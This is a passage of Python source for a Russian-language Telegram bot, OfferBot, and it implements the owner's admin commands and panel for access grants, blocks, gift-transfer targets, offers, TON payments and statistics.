    if low == "/broadcast" and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        awaiting_broadcast.add(cfg.owner_id)
        await reply_message(message, "<b>Рассылка</b>\nОтправьте текст, фото, видео или GIF. Для отмены: /cancel")
        return
    if low.startswith("/transfer ") or low.startswith("/передача "):
        await set_transfer(message, text.split(maxsplit=1)[1].strip())
        return
    if low.startswith("/reply ") and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        parts = text.split(maxsplit=2)
        if len(parts) < 3 or not parts[1].isdigit():
            await reply_message(message, "Формат: /reply USER_ID текст ответа")
            return
        try:
            await bot.send_message(int(parts[1]), "🛟 <b>Ответ поддержки</b>\n\n" + parts[2])
            await reply_message(message, "✅ Ответ отправлен.")
        except Exception as e:
            await reply_message(message, f"❌ Не удалось отправить ответ: {e}")
        return
    if low.startswith("/сброс") and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        parts = text.split(maxsplit=1)
        if len(parts) != 2:
            await reply_message(message, "Формат: <code>/сброс @username</code> или <code>/сброс USER_ID</code>\n\nСбрасывает все привязки аккаунта (делает его основным).\n\nПримеры:\n• <code>/сброс @username</code>\n• <code>/сброс 123456789</code>")
            return
        
        target = parts[1].strip()
        
        # Ищем пользователя
        if target.lstrip("@").isdigit():
            uid = int(target.lstrip("@"))
        else:
            found = db.find_user_by_username(target)
            if not found:
                await reply_message(message, "❌ Пользователь не найден.")
                return
            uid = int(found["user_id"])
        
        # Сбрасываем все привязки
        deleted = db.reset_all_links(uid)
        
        if deleted > 0:
            await reply_message(message, f"✅ Сброшено привязок: <b>{deleted}</b>\n\nПользователь <code>{uid}</code> теперь может привязывать твинки.")
        else:
            await reply_message(message, f"ℹ️ У пользователя <code>{uid}</code> не было привязок.")
        
        db.log_admin_action(cfg.owner_id, "reset_links", uid, f"deleted={deleted}")
        return
    if low.startswith("/поиск") and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        parts = text.split(maxsplit=1)
        if len(parts) != 2:
            await reply_message(message, "Формат: <code>/поиск @username</code> или <code>/поиск USER_ID</code>\n\nПримеры:\n• <code>/поиск @username</code>\n• <code>/поиск 123456789</code>")
            return
        
        target = parts[1].strip()
        
        # Ищем пользователя
        if target.lstrip("@").isdigit():
            uid = int(target.lstrip("@"))
            row = db.admin_user_detail(uid)
        else:
            found = db.find_user_by_username(target)
            if not found:
                await reply_message(message, "❌ Пользователь не найден. Он должен хотя бы раз запустить бота.")
                return
            uid = int(found["user_id"])
            row = db.admin_user_detail(uid)
        
        if not row:
            await reply_message(message, "❌ Пользователь не найден в базе данных.")
            return
        
        # Формируем информацию
        text_info = admin_user_detail_text(row)
        
        # Кнопки управления
        buttons = [
            [InlineKeyboardButton(text="Выдать доступ", callback_data=f"adm:usergrant:{uid}")],
            [InlineKeyboardButton(text="Забрать доступ", callback_data=f"adm:userremove:{uid}"), 
             InlineKeyboardButton(text="Заблокировать", callback_data=f"adm:userblock:{uid}")],
            [InlineKeyboardButton(text="Снять блокировку", callback_data=f"adm:userunblock:{uid}")],
            [InlineKeyboardButton(text="🔄 Сбросить привязки", callback_data=f"adm:resetlinks:{uid}")]
        ]
        
        await reply_message(message, text_info, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
        return
    
    # Команда /доступдел - удаление доступа (ВАЖНО: проверяем ДО /доступ!)
    if low.startswith("/доступдел") and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        log.info("REVOKE_ACCESS_COMMAND: Received from %s, text: %s", message.from_user.id, text)
        parts = text.split()
        if len(parts) != 2:
            await reply_message(message, "Формат: <code>/доступдел @username</code> или <code>/доступдел USER_ID</code>.\n\nПримеры:\n• <code>/доступдел @username</code>\n• <code>/доступдел 123456789</code>")
            return
        target = parts[1]
        log.info("REVOKE_ACCESS_COMMAND: target=%s", target)
        
        if target.lstrip("@").isdigit():
            uid = int(target.lstrip("@"))
            log.info("REVOKE_ACCESS_COMMAND: target is ID: %s", uid)
        else:
            log.info("REVOKE_ACCESS_COMMAND: target is username, searching: %s", target)
            found = db.find_user_by_username(target)
            if not found:
                log.warning("REVOKE_ACCESS_COMMAND: username not found: %s", target)
                await reply_message(message, "❌ Пользователь не найден. Он должен хотя бы раз запустить бота.")
                return
            uid = int(found["user_id"])
            log.info("REVOKE_ACCESS_COMMAND: found user_id: %s", uid)
        
        # Удаляем доступ
        db.revoke_access(uid)
        db.log_admin_action(cfg.owner_id, "revoke_access", uid, "access_removed")
        log.info("REVOKE_ACCESS_COMMAND: access revoked from %s", uid)
        
        try:
            await bot.send_message(uid, "❌ Ваш доступ к OfferBot был отозван.")
            log.info("REVOKE_ACCESS_COMMAND: notification sent to %s", uid)
        except Exception as e:
            log.error("REVOKE_ACCESS_COMMAND: failed to notify user %s: %s", uid, e)
        
        await reply_message(message, f"✅ Доступ удалён у пользователя <code>{uid}</code>.")
        log.info("REVOKE_ACCESS_COMMAND: success response sent")
        return
    
    # Команда /доступ - выдача доступа
    if low.startswith("/доступ") and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        log.info("ACCESS_COMMAND: Received from %s, text: %s", message.from_user.id, text)
        parts = text.split()
        if len(parts) != 3:
            await reply_message(message, "Формат: <code>/доступ @username время</code> или <code>/доступ USER_ID время</code>.\n\nПримеры:\n• <code>/доступ @username 24ч</code>\n• <code>/доступ @username 48h</code>\n• <code>/доступ 123456789 7д</code>\n• <code>/доступ 123456789 30мин</code>")
            return
        target, duration_raw = parts[1], parts[2]
        log.info("ACCESS_COMMAND: target=%s, duration_raw=%s", target, duration_raw)
        try:
            hours = parse_access_duration(duration_raw)
            log.info("ACCESS_COMMAND: parsed hours=%s", hours)
        except ValueError as e:
            log.error("ACCESS_COMMAND: parse error: %s", e)
            await reply_message(message, "❌ Неверный формат времени.\n\nПоддерживаемые форматы:\n• <code>24ч</code> или <code>24h</code> — часы\n• <code>7д</code> или <code>7d</code> — дни\n• <code>30м</code> или <code>30min</code> — минуты\n\nМинимум: 1 минута, максимум: 365 дней")
            return
        if target.lstrip("@").isdigit():
            uid = int(target.lstrip("@"))
            log.info("ACCESS_COMMAND: target is ID: %s", uid)
        else:
            log.info("ACCESS_COMMAND: target is username, searching: %s", target)
            found = db.find_user_by_username(target)
            if not found:
                log.warning("ACCESS_COMMAND: username not found: %s", target)
                await reply_message(message, "❌ Пользователь не найден. Он должен хотя бы раз запустить бота.")
                return
            uid = int(found["user_id"])
            log.info("ACCESS_COMMAND: found user_id: %s", uid)
        
        # Используем grant_paid_access чтобы можно было привязывать твинки
        db.grant_paid_access(uid, hours, "admin_command")
        db.unblock_offer_user(uid)
        db.log_admin_action(cfg.owner_id, "grant_timed_access", uid, f"hours={hours:g}")
        log.info("ACCESS_COMMAND: access granted to %s for %s hours", uid, hours)
        
        try:
            # Форматируем красивое отображение времени для пользователя
            if hours >= 24:
                days = int(hours // 24)
                remaining_hours = int(hours % 24)
                if remaining_hours > 0:
                    time_display = f"{days}д {remaining_hours}ч"
                else:
                    time_display = f"{days}д"
            elif hours >= 1:
                time_display = f"{int(hours)}ч"
            else:
                minutes = int(hours * 60)
                time_display = f"{minutes}мин"
            
            await bot.send_message(uid, f"✅ Вам выдан доступ к OfferBot на {time_display}.")
            log.info("ACCESS_COMMAND: notification sent to %s", uid)
        except Exception as e:
            log.error("ACCESS_COMMAND: failed to notify user %s: %s", uid, e)
        
        await reply_message(message, f"✅ Доступ выдан пользователю <code>{uid}</code> на <b>{duration_raw}</b>.")
        log.info("ACCESS_COMMAND: success response sent")
        return
    
    # Команда /сброс олд - удаление всех старых привязок
    if low.startswith("/сброс олд") and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        log.info("CLEANUP_OLD_LINKS: Starting cleanup of orphaned links")
        try:
            deleted_count = db.cleanup_all_orphaned_links()
            log.info("CLEANUP_OLD_LINKS: Deleted %d orphaned links", deleted_count)
            await reply_message(message, f"✅ Удалено старых привязок: <b>{deleted_count}</b>\n\n"
                                         f"Удалены все привязки где:\n"
                                         f"• Владелец больше не имеет активного доступа\n"
                                         f"• Твинк сам получил активный доступ")
            db.log_admin_action(cfg.owner_id, "cleanup_orphaned_links", None, f"deleted={deleted_count}")
        except Exception as e:
            log.error("CLEANUP_OLD_LINKS: Error: %s", e, exc_info=True)
            await reply_message(message, f"❌ Ошибка при удалении старых привязок: {e}")
        return
    
    if low.startswith("/block ") and message.from_user and message.from_user.id == cfg.owner_id:
        await admin_block(int(text.split(maxsplit=1)[1])); await reply_message(message, "Пользователь заблокирован."); return
    if low.startswith("/unblock ") and message.from_user and message.from_user.id == cfg.owner_id:
        uid=int(text.split(maxsplit=1)[1]); db.unblock_offer_user(uid); await reply_message(message, "Блокировка снята."); return
    if low.startswith("/setprofile ") and message.from_user and message.from_user.id == cfg.owner_id:
        parts = text.split(maxsplit=2)
        if len(parts) < 3:
            await reply_message(message, "❌ Формат: <code>/setprofile user_id @username</code>\n\nПример: <code>/setprofile 123456789 @myshop</code>")
            return
        try:
            target_user_id = int(parts[1])
            new_username = parts[2].lstrip("@")
            db.set_profile(target_user_id, new_username, f"tg://send_gift?to={new_username}")
            await reply_message(message, f"✅ Профиль кнопки 'Передать' для пользователя <code>{target_user_id}</code> изменён на @{new_username}")
            try:
                await bot.send_message(target_user_id, f"✅ Ваш профиль для кнопки 'Передать' изменён на @{new_username}")
            except Exception:
                pass
        except ValueError:
            await reply_message(message, "❌ Неверный формат user_id. Используйте числовой ID.")
        except Exception as e:
            await reply_message(message, f"❌ Ошибка: {e}")
        return


async def set_transfer(message: Message, username: str):
    if not message.from_user:
        return
    if not db.get_connection_for_user(message.from_user.id):
        await reply_message(message, "❌ Сначала подключите Telegram Business к этому боту.")
        return
    username = username.lstrip("@")
    db.set_profile(message.from_user.id, username, f"tg://send_gift?to={username}")
    await reply_message(message, f"✅ Transfer target сохранён: @{username}")


async def admin_allow(uid: int):
    db.add_access(uid); db.unblock_offer_user(uid)
    db.log_admin_action(cfg.owner_id, "grant_permanent_access", uid)
    for row in db.list_connections():
        if row["user_id"] == uid: db.set_connection_blocked(row["connection_id"], False)

async def admin_block(uid: int):
    db.block_offer_user(uid)
    db.log_admin_action(cfg.owner_id, "block_user", uid)
    for row in db.list_connections():
        if row["user_id"] == uid: db.set_connection_blocked(row["connection_id"], True)

async def admin_command(message: Message):
    if not message.from_user or message.from_user.id != cfg.owner_id:
        await reply_message(message, "Нет доступа.")
        return
    await reply_message(message, admin_home_text(), reply_markup=admin_keyboard())


def admin_home_text():
    data = db.admin_dashboard(0)
    offers = data['offers']
    today_offers, today_accepted, _ = db.daily_offer_stats()
    payment_today = db.payment_stats()
    return (
        "<b>OfferBot — панель управления</b>\n\n"
        f"Пользователи: <b>{db.total_users()}</b>\n"
        f"Активный доступ: <b>{data['active_access']}</b>\n"
        f"Оферы: <b>{offers['total']}</b>\nСегодня: <b>{today_offers}</b> · принято: <b>{today_accepted}</b>\n"
        f"Оплаты: <b>{data['paid']}</b> · всего: <b>{data['revenue']:.2f} TON</b>\n"
        f"Сегодня оплат: <b>{payment_today['paid_today']}</b> · <b>{payment_today['amount_today']:.2f} TON</b>\n"
        f"Приглашения: <b>{data['referrals']}</b> · успешные: <b>{data['referral_rewards']}</b>\n\n"
        "Выберите раздел."
    )


def admin_back_keyboard(target="home"):
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data=f"adm:{target}:0")]])


def admin_connections_text(offset: int = 0):
    rows = db.list_connections()[max(0, offset):max(0, offset)+8]
    lines = ["<b>Business-подключения</b>", ""]
    if not rows:
        lines.append("Подключений пока нет.")
    for r in rows:
        state = "Активно" if r['is_enabled'] else "Отключено"
        name = html.escape(r.get('first_name') or "Пользователь")
        lines.append(f"{name} · <code>{r['user_id']}</code> · {state}")
    return "\n".join(lines), len(rows) == 8


def admin_users_view(offset=0):
    query = admin_user_queries.get(cfg.owner_id, "")
    rows = db.admin_users(query, 8, offset)
    lines = ["<b>Пользователи</b>", f"Поиск: <code>{html.escape(query or 'не задан')}</code>", ""]
    buttons = []
    for r in rows:
        name = html.escape((r.get('first_name') or r.get('username') or 'Пользователь')[:24])
        state = "доступ активен" if r['has_access'] else "без доступа"
        lines.append(f"{name} · <code>{r['user_id']}</code> · {state}")
        buttons.append([InlineKeyboardButton(text=f"{name[:18]} · {r['user_id']}", callback_data=f"adm:user:{r['user_id']}")])
    if not rows:
        lines.append("Пользователи не найдены.")
    nav=[]
    if offset: nav.append(InlineKeyboardButton(text="Предыдущая", callback_data=f"adm:users:{max(0,offset-8)}"))
    if len(rows)==8: nav.append(InlineKeyboardButton(text="Следующая", callback_data=f"adm:users:{offset+8}"))
    if nav: buttons.append(nav)
    buttons += [[InlineKeyboardButton(text="Поиск", callback_data="adm:usersearch:0")], [InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]]
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=buttons)


def admin_user_detail_text(row):
    if not row:
        return "Пользователь не найден."
    name = html.escape(" ".join(x for x in [row.get('first_name'), row.get('last_name')] if x) or "Пользователь")
    expiry = row.get('expires_at')
    if expiry is None:
        access = "Бессрочно" if db.has_access(int(row['user_id']), cfg.owner_id, cfg.offer_access_mode) else "Нет активного доступа"
    else:
        # Конвертируем в МСК
        expiry_msk = to_msk(expiry)
        # Вычисляем оставшееся время
        now = datetime.now(timezone.utc)
        remaining_seconds = (expiry - now).total_seconds()
        
        if remaining_seconds > 0:
            days = int(remaining_seconds // 86400)
            hours = int((remaining_seconds % 86400) // 3600)
            minutes = int((remaining_seconds % 3600) // 60)
            
            # Формируем текст
            if days > 0:
                time_left = f"{days}д {hours}ч {minutes}мин"
            elif hours > 0:
                time_left = f"{hours}ч {minutes}мин"
            else:
                time_left = f"{minutes}мин"
            
            access = f"{time_left} (до {expiry_msk.strftime('%d.%m.%Y %H:%M МСК')})"
        else:
            access = "Истёк"
    
    return (f"<b>{name}</b>\nID: <code>{row['user_id']}</code>\nUsername: @{html.escape(row.get('username') or 'не указан')}\n"
            f"Регистрация: {row['created_at'].strftime('%d.%m.%Y') if row.get('created_at') else '—'}\n"
            f"Доступ: <b>{access}</b>\nИсточник доступа: {html.escape(row.get('source') or '—')}\n"
            f"Оферы: {row['offers']}\nОплаты: {row['paid_count']} на {float(row['paid_sum'] or 0):.2f} TON\n"
            f"Приглашено: {row['referrals']}\nBusiness-подключения: {row['connections']}\nБлокировка оферов: {'Да' if row['offer_blocked'] else 'Нет'}")


@dp.callback_query(F.data.startswith("adm:"))
async def admin_callback(call: CallbackQuery):
    if not call.from_user or call.from_user.id != cfg.owner_id:
        await call.answer("Нет доступа", show_alert=True)
        return
    parts = call.data.split(":", 2)
    action = parts[1] if len(parts) > 1 else "home"
    raw_arg = parts[2] if len(parts) > 2 else "0"
    try:
        offset = max(0, int(raw_arg))
    except ValueError:
        offset = 0

    if action == "stats":
        days = offset if offset in (7, 30) else 0
        data = db.admin_dashboard(days)
        o = data['offers']
        period = "за всё время" if not days else f"за {days} дней"
        total = o['total']
        accepted_pct = (o['accepted'] / total * 100) if total else 0
        text = (f"<b>Статистика · {period}</b>\n\n"
                f"Оферы: <b>{total}</b>\nПриняты: {o['accepted']} ({accepted_pct:.1f}%)\n"
                f"Отклонены: {o['declined']}\nИстекли: {o['expired']}\nОжидают: {o['pending']}\n\n"
                f"Новые пользователи: <b>{data['new_users']}</b>\nАктивный доступ: <b>{data['active_access']}</b>\n"
                f"Business-подключения: {data['active_connections']}\n\n"
                f"Оплачено: <b>{data['paid']}</b>\nОжидают оплаты: {data['pending_payments']}\n"
                f"Получено: <b>{data['revenue']:.2f} TON</b>\n\n"
                f"Приглашения: {data['referrals']}\nНачислено бонусов: {data['referral_rewards']}")
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Всё время", callback_data="adm:stats:0"), InlineKeyboardButton(text="7 дней", callback_data="adm:stats:7"), InlineKeyboardButton(text="30 дней", callback_data="adm:stats:30")],
            [InlineKeyboardButton(text="Скачать CSV", callback_data=f"adm:export:{days}")],
            [InlineKeyboardButton(text="Назад", callback_data="adm:home:0")]])
        await call.message.edit_text(text, reply_markup=markup); await call.answer(); return

    if action == "export":
        days = offset if offset in (7, 30) else 0
        data = db.admin_dashboard(days)
        o = data['offers']
        rows = [
            ("Показатель", "Значение"),
            ("Период", "Всё время" if not days else f"{days} дней"),
            ("Всего оферов", o['total']), ("Принятые оферы", o['accepted']),
            ("Отклонённые оферы", o['declined']), ("Истёкшие оферы", o['expired']),
            ("Ожидающие оферы", o['pending']), ("Новые пользователи", data['new_users']),
            ("Активный доступ", data['active_access']), ("Business-подключения", data['active_connections']),
            ("Успешные оплаты", data['paid']), ("Ожидающие оплаты", data['pending_payments']),
            ("Получено TON", f"{data['revenue']:.2f}"), ("Приглашения", data['referrals']),
            ("Реферальные начисления", data['referral_rewards']),
        ]
        stream = io.StringIO()
        writer = csv.writer(stream, delimiter=';')
        writer.writerows(rows)
        document = BufferedInputFile(stream.getvalue().encode('utf-8-sig'), filename=f"offerbot_stats_{days or 'all'}.csv")
        await call.answer("Отчёт подготовлен")
        await bot.send_document(cfg.owner_id, document, caption="Отчёт OfferBot")
        return

    if action == "users":
        text, markup = admin_users_view(offset)
        await call.message.edit_text(text, reply_markup=markup); await call.answer(); return

    if action == "usersearch":
        awaiting_admin_search.add(cfg.owner_id)
        await call.answer()
        await call.message.answer("Отправьте Telegram ID, @username или часть имени. Для отмены: /cancel")
        return

    if action == "user":
        uid = offset
        row = db.admin_user_detail(uid)
        prank_status = "🟢 Вкл" if db.is_prank_mode(uid) else "🔴 Выкл"
        buttons = [
            [InlineKeyboardButton(text="Выдать временный доступ", callback_data=f"adm:usergrant:{uid}")],
            [InlineKeyboardButton(text="Забрать доступ", callback_data=f"adm:userremove:{uid}"), InlineKeyboardButton(text="Заблокировать", callback_data=f"adm:userblock:{uid}")],
            [InlineKeyboardButton(text="Снять блокировку", callback_data=f"adm:userunblock:{uid}")],
            [InlineKeyboardButton(text=f"Пранк: {prank_status}", callback_data=f"adm:toggleprank:{uid}")],
            [InlineKeyboardButton(text="🔄 Сбросить привязки", callback_data=f"adm:resetlinks:{uid}")],
            [InlineKeyboardButton(text="К списку", callback_data="adm:users:0"), InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]]
        await call.message.edit_text(admin_user_detail_text(row), reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)); await call.answer(); return

    if action == "usergrant":
        uid = offset
        awaiting_access_grant.add(cfg.owner_id)
        await call.answer()
        await call.message.answer(f"Отправьте срок в часах для пользователя <code>{uid}</code> в формате: <code>{uid} 24</code>. Для отмены: /cancel")
        return

    if action == "userremove":
        db.remove_access(offset)
        db.log_admin_action(cfg.owner_id, "remove_access", offset)
        await call.answer("Доступ удалён", show_alert=True)
        row = db.admin_user_detail(offset)
        await call.message.edit_text(admin_user_detail_text(row), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад к пользователям", callback_data="adm:users:0")],[InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]])); return

    if action == "userblock":
        await admin_block(offset)
        await call.answer("Пользователь заблокирован", show_alert=True)
        row = db.admin_user_detail(offset)
        await call.message.edit_text(admin_user_detail_text(row), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад к пользователям", callback_data="adm:users:0")],[InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]])); return

    if action == "userunblock":
        db.unblock_offer_user(offset)
        db.log_admin_action(cfg.owner_id, "unblock_user", offset)
        for connection in db.list_connections():
            if int(connection['user_id']) == offset:
                db.set_connection_blocked(connection['connection_id'], False)
        await call.answer("Блокировка снята", show_alert=True)
        row = db.admin_user_detail(offset)
        await call.message.edit_text(admin_user_detail_text(row), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад к пользователям", callback_data="adm:users:0")],[InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]])); return
    
    if action == "toggleprank":
        uid = offset
        current = db.is_prank_mode(uid)
        db.set_prank_mode(uid, not current)
        status = "включён" if not current else "выключен"
        db.log_admin_action(cfg.owner_id, "toggle_prank", uid, f"prank={not current}")
        await call.answer(f"Режим пранка {status}", show_alert=True)
        # Обновляем сообщение
        row = db.admin_user_detail(uid)
        prank_status = "🟢 Вкл" if db.is_prank_mode(uid) else "🔴 Выкл"
        buttons = [
            [InlineKeyboardButton(text="Выдать временный доступ", callback_data=f"adm:usergrant:{uid}")],
            [InlineKeyboardButton(text="Забрать доступ", callback_data=f"adm:userremove:{uid}"), InlineKeyboardButton(text="Заблокировать", callback_data=f"adm:userblock:{uid}")],
            [InlineKeyboardButton(text="Снять блокировку", callback_data=f"adm:userunblock:{uid}")],
            [InlineKeyboardButton(text=f"Пранк: {prank_status}", callback_data=f"adm:toggleprank:{uid}")],
            [InlineKeyboardButton(text="🔄 Сбросить привязки", callback_data=f"adm:resetlinks:{uid}")],
            [InlineKeyboardButton(text="К списку", callback_data="adm:users:0"), InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]]
        await call.message.edit_text(admin_user_detail_text(row), reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
        return

    if action == "resetlinks":
        deleted = db.reset_all_links(offset)
        db.log_admin_action(cfg.owner_id, "reset_links", offset, f"deleted={deleted}")
        if deleted > 0:
            await call.answer(f"Сброшено привязок: {deleted}", show_alert=True)
        else:
            await call.answer("Не было привязок", show_alert=True)
        row = db.admin_user_detail(offset)
        await call.message.edit_text(admin_user_detail_text(row), reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Выдать временный доступ", callback_data=f"adm:usergrant:{offset}")],
            [InlineKeyboardButton(text="Забрать доступ", callback_data=f"adm:userremove:{offset}"), InlineKeyboardButton(text="Заблокировать", callback_data=f"adm:userblock:{offset}")],
            [InlineKeyboardButton(text="Снять блокировку", callback_data=f"adm:userunblock:{offset}")],
            [InlineKeyboardButton(text="🔄 Сбросить привязки", callback_data=f"adm:resetlinks:{offset}")],
            [InlineKeyboardButton(text="К списку", callback_data="adm:users:0"), InlineKeyboardButton(text="В админку", callback_data="adm:home:0")]
        ])); return

    if action == "offers":
        if raw_arg in {"all", "pending", "accepted", "declined", "expired"}:
            admin_offer_filters[cfg.owner_id] = raw_arg
            offset = 0
        status = admin_offer_filters.get(cfg.owner_id, "all")
        rows = db.admin_offers(status, 8, offset)
        labels = {"all":"все", "pending":"ожидают", "accepted":"приняты", "declined":"отклонены", "expired":"истекли"}
        lines = [f"<b>Оферы · {labels.get(status,status)}</b>", ""]
        buttons=[]
        for r in rows:
            gift = html.escape(str(r['gift_name'])[:18])
            lines.append(f"#{r['id']} · {gift} · {r['amount']:g} {r['currency']} · {r['status']}")
            buttons.append([InlineKeyboardButton(text=f"Офер #{r['id']} · {gift[:14]}", callback_data=f"adm:offer:{r['id']}")])
        if not rows: lines.append("Оферов в этом разделе нет.")
        buttons.append([InlineKeyboardButton(text="Все", callback_data="adm:offers:all"), InlineKeyboardButton(text="Ожидают", callback_data="adm:offers:pending")])
        buttons.append([InlineKeyboardButton(text="Приняты", callback_data="adm:offers:accepted"), InlineKeyboardButton(text="Отклонены", callback_data="adm:offers:declined"), InlineKeyboardButton(text="Истекли", callback_data="adm:offers:expired")])
        nav=[]
        if offset: nav.append(InlineKeyboardButton(text="Предыдущая", callback_data=f"adm:offerpage:{max(0,offset-8)}"))
        if len(rows)==8: nav.append(InlineKeyboardButton(text="Следующая", callback_data=f"adm:offerpage:{offset+8}"))
        if nav: buttons.append(nav)
        buttons.append([InlineKeyboardButton(text="В админку", callback_data="adm:home:0")])
        await call.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)); await call.answer(); return

    if action == "offerpage":
        status = admin_offer_filters.get(cfg.owner_id, "all")
        rows = db.admin_offers(status, 8, offset)
        lines=[f"<b>Оферы · {status}</b>", ""]
        buttons=[]
        for r in rows:
            gift=html.escape(str(r['gift_name'])[:18]); lines.append(f"#{r['id']} · {gift} · {r['amount']:g} {r['currency']} · {r['status']}")
            buttons.append([InlineKeyboardButton(text=f"Офер #{r['id']} · {gift[:14]}", callback_data=f"adm:offer:{r['id']}")])
        nav=[]
        if offset: nav.append(InlineKeyboardButton(text="Предыдущая", callback_data=f"adm:offerpage:{max(0,offset-8)}"))
        if len(rows)==8: nav.append(InlineKeyboardButton(text="Следующая", callback_data=f"adm:offerpage:{offset+8}"))
        if nav: buttons.append(nav)
        buttons.append([InlineKeyboardButton(text="Назад", callback_data="adm:offers:all")])
        await call.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)); await call.answer(); return

    if action == "offer":
        row = db.get_offer(offset)
        if not row:
            await call.answer("Офер не найден", show_alert=True); return
        text=(f"<b>Офер #{row['id']}</b>\n\nПодарок: {html.escape(row['gift_name'])} #{row['gift_number']}\n"
              f"Продавец: <code>{row['seller_id']}</code>\nПокупатель: <code>{row['buyer_id']}</code>\n"
              f"Сумма: <b>{row['amount']:g} {row['currency']}</b>\nСтатус: {row['status']}\n"
              f"Создан: {row['created_at'].strftime('%d.%m.%Y %H:%M') if row.get('created_at') else '—'}\n"
              f"Ссылка: {html.escape(row['gift_url'])}")
        await call.message.edit_text(text, reply_markup=admin_back_keyboard("offers")); await call.answer(); return

    if action == "payments":
        # Обработка фильтра
        if raw_arg in {"all", "paid", "pending", "cancelled"}:
            admin_offer_filters[f"{cfg.owner_id}_payments"] = raw_arg
            offset = 0
        status_filter = admin_offer_filters.get(f"{cfg.owner_id}_payments", "all")
        
        rows=db.admin_payments(8, offset, status_filter)
        
        # Заголовок с фильтром
        filter_labels = {"all": "все", "paid": "оплачены", "pending": "ожидают", "cancelled": "отменены"}
        lines=[f"<b>Платежи · {filter_labels.get(status_filter, status_filter)}</b>", ""]
        buttons=[]
        
        for r in rows:
            # Конвертируем время в МСК
            msk_time = to_msk(r.get('created_at'))
            stamp = msk_time.strftime('%d.%m %H:%M') if msk_time else '—'
            # Формируем отображаемое имя
            username = f"@{r['username']}" if r.get('username') else ""
            name = " ".join(x for x in [r.get('first_name'), r.get('last_name')] if x) or ""
            user_display = username if username else (name if name else f"ID {r['user_id']}")
            
            lines.append(f"#{r['id']} · {user_display} · {r['amount']:g} TON · {r['status']} · {stamp} МСК")
            buttons.append([InlineKeyboardButton(text=f"Платёж #{r['id']} · {r['amount']:g} TON", callback_data=f"adm:payment:{r['id']}")])
        
        if not rows: lines.append("Платежей пока нет.")
        
        # Кнопки фильтров
        filter_buttons = [
            InlineKeyboardButton(text="Все", callback_data="adm:payments:all"),
            InlineKeyboardButton(text="Оплачены", callback_data="adm:payments:paid"),
            InlineKeyboardButton(text="Ожидают", callback_data="adm:payments:pending"),
            InlineKeyboardButton(text="Отменены", callback_data="adm:payments:cancelled")
        ]
        buttons.insert(0, filter_buttons)
        
        # Навигация
        nav=[]
        if offset: nav.append(InlineKeyboardButton(text="Предыдущая", callback_data=f"adm:paymentpage:{max(0,offset-8)}"))
        if len(rows)==8: nav.append(InlineKeyboardButton(text="Следующая", callback_data=f"adm:paymentpage:{offset+8}"))
        if nav: buttons.append(nav)
        
        buttons.append([InlineKeyboardButton(text="Назад", callback_data="adm:home:0")])
        await call.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)); await call.answer(); return

    if action == "paymentpage":
        # Навигация по платежам с сохранением фильтра
        status_filter = admin_offer_filters.get(f"{cfg.owner_id}_payments", "all")
        rows=db.admin_payments(8, offset, status_filter)
        
        filter_labels = {"all": "все", "paid": "оплачены", "pending": "ожидают", "cancelled": "отменены"}
        lines=[f"<b>Платежи · {filter_labels.get(status_filter, status_filter)}</b>", ""]
        buttons=[]
        
        for r in rows:
            msk_time = to_msk(r.get('created_at'))
            stamp = msk_time.strftime('%d.%m %H:%M') if msk_time else '—'
            username = f"@{r['username']}" if r.get('username') else ""
            name = " ".join(x for x in [r.get('first_name'), r.get('last_name')] if x) or ""
            user_display = username if username else (name if name else f"ID {r['user_id']}")
            
            lines.append(f"#{r['id']} · {user_display} · {r['amount']:g} TON · {r['status']} · {stamp} МСК")
            buttons.append([InlineKeyboardButton(text=f"Платёж #{r['id']} · {r['amount']:g} TON", callback_data=f"adm:payment:{r['id']}")])
        
        if not rows: lines.append("Платежей пока нет.")
        
        filter_buttons = [
            InlineKeyboardButton(text="Все", callback_data="adm:payments:all"),
            InlineKeyboardButton(text="Оплачены", callback_data="adm:payments:paid"),
            InlineKeyboardButton(text="Ожидают", callback_data="adm:payments:pending"),
            InlineKeyboardButton(text="Отменены", callback_data="adm:payments:cancelled")
        ]
        buttons.insert(0, filter_buttons)
        
        nav=[]
        if offset: nav.append(InlineKeyboardButton(text="Предыдущая", callback_data=f"adm:paymentpage:{max(0,offset-8)}"))
        if len(rows)==8: nav.append(InlineKeyboardButton(text="Следующая", callback_data=f"adm:paymentpage:{offset+8}"))
        if nav: buttons.append(nav)
        
        buttons.append([InlineKeyboardButton(text="Назад", callback_data="adm:payments:all")])
        await call.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)); await call.answer(); return

    if action == "payment":
        row = db.get_payment_by_id(offset)
        if not row:
            await call.answer("Платёж не найден", show_alert=True); return
        # Конвертируем время в МСК
        created_msk = to_msk(row.get('created_at'))
        paid_msk = to_msk(row.get('paid_at'))
        created = created_msk.strftime('%d.%m.%Y %H:%M МСК') if created_msk else '—'
        paid = paid_msk.strftime('%d.%m.%Y %H:%M МСК') if paid_msk else '—'
